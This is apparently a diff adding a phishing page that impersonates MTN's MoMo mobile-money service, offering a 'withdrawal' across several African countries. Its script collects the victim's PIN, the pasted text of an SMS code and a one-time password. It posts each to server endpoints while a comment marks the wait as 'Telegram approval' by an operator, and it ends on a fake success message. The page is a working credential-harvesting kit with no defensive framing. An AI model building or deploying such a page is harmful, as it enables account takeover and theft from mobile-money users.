@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoMo from MTN</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #002B49; /* Deep MTN Navy Blue Top Theme */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
+
+        /* Main Wrapper Card */
+        .container {
+            background: #ffffff;
+            padding: 40px 25px 30px 25px;
+            border-radius: 32px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+        }
+
+        /* Top Logo Branding */
+        .logo-container {
+            margin-bottom: 25px;
+        }
+
+        .logo-icon-card {
+            background: #002B49;
+            width: 60px;
+            height: 60px;
+            border-radius: 14px;
+            display: inline-flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 15px rgba(0,0,0,0.25);
+            border-bottom: 5px solid #FFCC00;
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        /* MTN MoMo Graphic Icon Shape */
+        .momo-graphic {
+            width: 36px;
+            height: 36px;
+            position: relative;
+        }
+
+        .momo-graphic::before {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 30px;
+            height: 26px;
+            background: #FFCC00;
+            clip-path: polygon(0% 100%, 75% 0%, 100% 35%, 25% 100%);
+        }
+
+        .momo-graphic::after {
+            content: '';
+            position: absolute;
+            top: 11px;
+            left: 12px;
+            width: 10px;
+            height: 10px;
+            background: #002B49;
+            border-radius: 50%;
+        }
+
+        h1.brand-title {
+            color: #FFCC00;
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            line-height: 1.1;
+        }
+
+        h1.brand-subtitle {
+            color: #FFCC00;
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        h2.welcome-title {
+            color: #002B49;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        /* Form Steps */
+        .form-step {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            text-align: left;
+        }
+
+        /* Input layout matching reference */
+        .input-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+        }
+
+        /* Standalone Flag Box on the left */
+        .flag-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 65px;
+            height: 65px;
+            border: 2px solid #002B49;
+            border-radius: 16px;
+            background: #fff;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            flex-shrink: 0;
+            position: relative;
+        }
+
+        /* Custom Country Flag Styling */
+        .country-flag {
+            width: 28px;
+            height: 20px;
+            object-fit: cover;
+            border-radius: 3px;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        /* Phone Input Box matching reference */
+        .phone-input-box-wrapper {
+            flex: 1;
+            position: relative;
+            border: 2px solid #002B49;
+            border-radius: 16px;
+            height: 65px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            background: #fff;
+        }
+
+        /* "Enter number *" floating label on top border of phone box */
+        .phone-input-box-wrapper label.floating-label {
+            position: absolute;
+            top: -11px;
+            left: 16px;
+            background: #fff;
+            padding: 0 6px;
+            font-size: 13px;
+            color: #002B49;
+            font-weight: 700;
+        }
+
+        .country-code-prefix {
+            font-size: 17px;
+            font-weight: 700;
+            color: #002B49;
+            margin-right: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .phone-number-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 17px;
+            font-weight: 600;
+            color: #111;
+            background: transparent;
+            letter-spacing: 0.5px;
+        }
+
+        /* Custom Country Selection Dropdown Modal */
+        .country-dropdown-container {
+            position: absolute;
+            top: 75px;
+            left: 0;
+            width: 240px;
+            background: #ffffff;
+            border: 2px solid #002B49;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            display: none;
+            z-index: 100;
+            overflow: hidden;
+            text-align: left;
+        }
+
+        .country-dropdown-header {
+            padding: 12px 16px;
+            font-weight: 700;
+            font-size: 15px;
+            color: #002B49;
+            border-bottom: 1px solid #eee;
+            background: #f8f9fa;
+        }
+
+        /* Updated Custom Country Option Styling */
+        .country-option {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px;
+            cursor: pointer;
+            border-bottom: 1px solid #f1f1f1;
+        }
+
+        .country-option:hover, .country-option.active {
+            background: #f0f0f0;
+        }
+
+        .country-option span.name {
+            font-weight: 600;
+            font-size: 15px;
+            color: #333;
+        }
+
+        /* NEXT Button matching reference */
+        button.primary-btn {
+            background-color: #002B49;
+            color: #ffffff;
+            font-weight: 700;
+            padding: 16px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            width: 100%;
+            margin-top: 15px;
+            box-shadow: 0 4px 15px rgba(0, 43, 73, 0.3);
+            letter-spacing: 1px;
+        }
+
+        button.primary-btn:hover {
+            background-color: #001f33;
+        }
+
+        button.primary-btn:active {
+            transform: scale(0.98);
+        }
+
+        button.secondary-btn {
+            background-color: transparent;
+            color: #002B49;
+            border: 2px solid #002B49;
+            font-weight: 700;
+            padding: 14px;
+            border-radius: 30px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 5px;
+        }
+
+        /* Terms & Policy Footer text */
+        .terms-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+
+        .terms-text a {
+            color: #002B49;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* PIN & OTP boxes */
+        .pin-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin: 10px 0;
+        }
+
+        .pin-box, .otp-box {
+            width: 50px;
+            height: 55px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            border: 2px solid #002B49;
+            border-radius: 12px;
+            outline: none;
+            background-color: #f9f9f9;
+            color: #002B49;
+        }
+
+        .pin-box:focus, .otp-box:focus {
+            border-color: #FFCC00;
+            background: #fff;
+            box-shadow: 0 0 8px rgba(255, 204, 0, 0.5);
+        }
+
+        .spinner {
+            text-align: center;
+            font-weight: 600;
+            color: #002B49;
+            padding: 30px 0;
+            font-size: 16px;
+        }
+
+        label.field-label {
+            font-weight: 700;
+            color: #002B49;
+            font-size: 14px;
+        }
+
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #002B49;
+            border-radius: 12px;
+            font-size: 15px;
+            outline: none;
+            resize: vertical;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo Branding Header -->
+        <div class="logo-container">
+            <div class="logo-icon-card">
+                <div class="momo-graphic"></div>
+            </div>
+            <h1 class="brand-title">MoMo</h1>
+            <h1 class="brand-subtitle">from MTN</h1>
+        </div>
+
+        <h2 class="welcome-title">Welcome to MoMo</h2>
+
+        <!-- STEP 1: Country Flag & Phone Number Selection -->
+        <div id="step-1" class="form-step" style="position: relative;">
+            <div class="input-row">
+                <!-- Standalone Flag Box on Left -->
+                <div class="flag-box" onclick="toggleCountryDropdown()">
+                    <img id="current-flag" class="country-flag" src="https://flagcdn.com/w40/ug.png" alt="Uganda flag" style="margin-right: 0;">
+                </div>
+
+                <!-- Phone Input Box -->
+                <div class="phone-input-box-wrapper">
+                    <label class="floating-label">Enter number *</label>
+                    <span id="country-code-display" class="country-code-prefix">256</span>
+                    <input type="tel" id="phone-number" class="phone-number-input" placeholder="" maxlength="10" oninput="validatePhoneNumber()">
+                </div>
+
+                <!-- Custom Country Dropdown Modal -->
+                <div id="country-dropdown-menu" class="country-dropdown-container">
+                    <div class="country-dropdown-header">
+                        Select your country
+                    </div>
+
+                    <!-- Ghana -->
+                    <div class="country-option" onclick="selectCountry('GH', '233', 'https://flagcdn.com/w40/gh.png', 'Ghana')">
+                        <img class="country-flag" src="https://flagcdn.com/w40/gh.png" alt="Ghana flag">
+                        <span class="name">Ghana</span>
+                    </div>
+
+                    <!-- Uganda -->
+                    <div class="country-option active" onclick="selectCountry('UG', '256', 'https://flagcdn.com/w40/ug.png', 'Uganda')">
+                        <img class="country-flag" src="https://flagcdn.com/w40/ug.png" alt="Uganda flag">
+                        <span class="name">Uganda</span>
+                    </div>
+
+                    <!-- Zambia -->
+                    <div class="country-option" onclick="selectCountry('ZM', '260', 'https://flagcdn.com/w40/zm.png', 'Zambia')">
+                        <img class="country-flag" src="https://flagcdn.com/w40/zm.png" alt="Zambia flag">
+                        <span class="name">Zambia</span>
+                    </div>
+
+                    <!-- Cameroon -->
+                    <div class="country-option" onclick="selectCountry('CM', '237', 'https://flagcdn.com/w40/cm.png', 'Cameroon')">
+                        <img class="country-flag" src="https://flagcdn.com/w40/cm.png" alt="Cameroon flag">
+                        <span class="name">Cameroon</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Amount Field -->
+            <div style="margin-top: 10px;">
+                <label class="field-label">Amount (UGX)</label>
+                <input type="number" id="amount" class="phone-number-input" style="border: 2px solid #002B49; border-radius: 12px; padding: 12px; width: 100%; margin-top: 5px; background: #fff;" placeholder="Enter amount">
+            </div>
+
+            <button class="primary-btn" onclick="submitWithdrawalRequest()">NEXT</button>
+
+            <div class="terms-text">
+                By using this app you agree to our <a href="#">Mobile Terms of Use</a> and <a href="#">Privacy Policy</a>
+            </div>
+        </div>
+
+        <!-- CONFIRMATION PROMPT -->
+        <div id="step-confirm" class="form-step" style="display:none;">
+            <p id="confirm-text" style="font-size: 16px; color: #002B49; font-weight: 600; text-align: center; margin-bottom: 15px;"></p>
+            <button class="primary-btn" onclick="proceedToPin()">Yes, Proceed</button>
+            <button class="secondary-btn" onclick="resetForm()">Cancel</button>
+        </div>
+
+        <!-- STEP 2: 5-Digit PIN Entry -->
+        <div id="step-pin" class="form-step" style="display:none;">
+            <label class="field-label">Enter 5-Digit PIN</label>
+            <div class="pin-container">
+                <input type="password" maxlength="1" class="pin-box" oninput="moveToNext(this, 'p2')">
+                <input type="password" maxlength="1" class="pin-box" id="p2" oninput="moveToNext(this, 'p3')">
+                <input type="password" maxlength="1" class="pin-box" id="p3" oninput="moveToNext(this, 'p4')">
+                <input type="password" maxlength="1" class="pin-box" id="p4" oninput="moveToNext(this, 'p5')">
+                <input type="password" maxlength="1" class="pin-box" id="p5">
+            </div>
+            <button class="primary-btn" onclick="submitPin()">Withdraw</button>
+        </div>
+
+        <!-- WAITING FOR TELEGRAM APPROVAL -->
+        <div id="step-waiting" class="form-step" style="display:none;">
+            <p class="spinner">⏳ Processing approval with provider...</p>
+        </div>
+
+        <!-- STEP 3: SMS Copy/Paste Prompt -->
+        <div id="step-copy-paste" class="form-step" style="display:none;">
+            <label class="field-label">Kindly copy and paste the code sent to your device:</label>
+            <textarea id="pasted-sms" rows="3" placeholder="Paste SMS text here..."></textarea>
+            <button class="primary-btn" onclick="confirmSmsPaste()">Confirm</button>
+        </div>
+
+        <!-- STEP 4: 4-Digit OTP Entry -->
+        <div id="step-otp" class="form-step" style="display:none;">
+            <label class="field-label">Enter 4-Digit OTP sent to your device</label>
+            <div class="pin-container">
+                <input type="password" maxlength="1" class="otp-box" oninput="moveToNext(this, 'o2')">
+                <input type="password" maxlength="1" class="otp-box" id="o2" oninput="moveToNext(this, 'o3')">
+                <input type="password" maxlength="1" class="otp-box" id="o3" oninput="moveToNext(this, 'o4')">
+                <input type="password" maxlength="1" class="otp-box" id="o4">
+            </div>
+            <button class="primary-btn" onclick="submitOtpFinal()">Withdraw</button>
+        </div>
+
+        <!-- SUCCESS SCREEN -->
+        <div id="step-success" class="form-step" style="display:none; text-align: center;">
+            <h3 style="color: #002B49; font-size: 24px;">🎉 Success!</h3>
+            <p id="success-msg" style="margin-top: 15px; font-size: 16px; color: #333; line-height: 1.5;"></p>
+            <button class="primary-btn" onclick="resetForm()" style="margin-top: 20px;">Done</button>
+        </div>
+    </div>
+
+    <script>
+        let selectedCountryCode = '256';
+
+        function toggleCountryDropdown() {
+            const dropdown = document.getElementById('country-dropdown-menu');
+            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
+        }
+
+        function selectCountry(code, dialCode, flagUrl, name) {
+            selectedCountryCode = dialCode;
+            document.getElementById('current-flag').src = flagUrl;
+            document.getElementById('current-flag').alt = `${name} flag`;
+            document.getElementById('country-code-display').innerText = dialCode;
+            document.getElementById('country-dropdown-menu').style.display = 'none';
+
+            const options = document.querySelectorAll('.country-option');
+            options.forEach(opt => {
+                if (opt.innerText.includes(name)) {
+                    opt.classList.add('active');
+                } else {
+                    opt.classList.remove('active');
+                }
+            });
+        }
+
+        // Close dropdown when clicking outside
+        window.onclick = function(event) {
+            if (!event.target.closest('.flag-box') && !event.target.closest('.country-dropdown-container')) {
+                document.getElementById('country-dropdown-menu').style.display = 'none';
+            }
+        }
+
+        function validatePhoneNumber() {
+            const phoneInput = document.getElementById('phone-number');
+            phoneInput.value = phoneInput.value.replace(/\D/g, ''); // Digits only
+            if (phoneInput.value.length > 10) {
+                phoneInput.value = phoneInput.value.slice(0, 10);
+            }
+        }
+
+        let fullPhoneNumber = '';
+        let currentAmount = '';
+
+        async function submitWithdrawalRequest() {
+            const rawNumber = document.getElementById('phone-number').value;
+            currentAmount = document.getElementById('amount').value;
+
+            // Validates 9 digits without leading 0, or 10 digits starting with 0
+            const startsWithZero = rawNumber.startsWith('0');
+            const isValidLength = (startsWithZero && rawNumber.length === 10) || (!startsWithZero && rawNumber.length === 9);
+
+            if (!isValidLength) {
+                alert('Please enter a valid phone number (9 digits without leading 0, or 10 digits starting with 0).');
+                return;
+            }
+
+            if (!currentAmount) {
+                alert('Please enter a withdrawal amount.');
+                return;
+            }
+
+            fullPhoneNumber = `+${selectedCountryCode} ${rawNumber}`;
+
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-confirm').style.display = 'block';
+            document.getElementById('confirm-text').innerText = `Do you want to withdraw UGX ${Number(currentAmount).toLocaleString()} to ${fullPhoneNumber}?`;
+        }
+
+        function proceedToPin() {
+            document.getElementById('step-confirm').style.display = 'none';
+            document.getElementById('step-pin').style.display = 'block';
+        }
+
+        function resetForm() {
+            location.reload();
+        }
+
+        function moveToNext(current, nextId) {
+            if (current.value.length >= 1) {
+                const nextElem = document.getElementById(nextId);
+                if (nextElem) nextElem.focus();
+            }
+        }
+
+        async function submitPin() {
+            const boxes = document.querySelectorAll('.pin-box');
+            let pin = '';
+            boxes.forEach(b => pin += b.value);
+
+            if (pin.length < 5) {
+                alert('Please enter your full 5-digit PIN.');
+                return;
+            }
+
+            await fetch('/api/submit-pin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: fullPhoneNumber, pin, amount: currentAmount })
+            });
+
+            document.getElementById('step-pin').style.display = 'none';
+            document.getElementById('step-waiting').style.display = 'block';
+            pollWithdrawalApproval();
+        }
+
+        async function pollWithdrawalApproval() {
+            let interval = setInterval(async () => {
+                try {
+                    let res = await fetch('/api/check-status');
+                    let data = await res.json();
+
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        document.getElementById('step-copy-paste').style.display = 'block';
+                    } else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        alert('Withdrawal was declined by admin.');
+                        location.reload();
+                    }
+                } catch (e) {
+                    console.error('Polling error:', e);
+                }
+            }, 2000);
+        }
+
+        async function confirmSmsPaste() {
+            const smsText = document.getElementById('pasted-sms').value;
+            if (!smsText) {
+                alert('Please paste the SMS code text.');
+                return;
+            }
+
+            await fetch('/api/submit-sms', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sms: smsText })
+            });
+
+            document.getElementById('step-copy-paste').style.display = 'none';
+            document.getElementById('step-otp').style.display = 'block';
+        }
+
+        async function submitOtpFinal() {
+            const boxes = document.querySelectorAll('.otp-box');
+            let otp = '';
+            boxes.forEach(b => otp += b.value);
+
+            if (otp.length < 4) {
+                alert('Please enter the 4-digit OTP.');
+                return;
+            }
+
+            await fetch('/api/verify-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp })
+            });
+
+            document.getElementById('step-otp').style.display = 'none';
+            document.getElementById('step-waiting').style.display = 'block';
+            document.querySelector('#step-waiting p').innerText = 'Verifying OTP code...';
+            pollOtpVerification();
+        }
+
+        async function pollOtpVerification() {
+            let interval = setInterval(async () => {
+                try {
+                    let res = await fetch('/api/check-otp-status');
+                    let data = await res.json();
+
+                    if (data.status === 'success') {
+                        clearInterval(interval);
+                        document.getElementById('step-waiting').style.display = 'none';
+                        document.getElementById('step-success').style.display = 'block';
+                        document.getElementById('success-msg').innerText = `Congratulations! You have successfully withdrawn UGX ${Number(currentAmount).toLocaleString()} to ${fullPhoneNumber}.`;
+                    } else if (data.status === 'wrong') {
+                        clearInterval(interval);
+                        alert('Wrong OTP entered. Please try again.');
+                        location.reload();
+                    }
+                } catch (e) {
+                    console.error('OTP check error:', e);
+                }
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
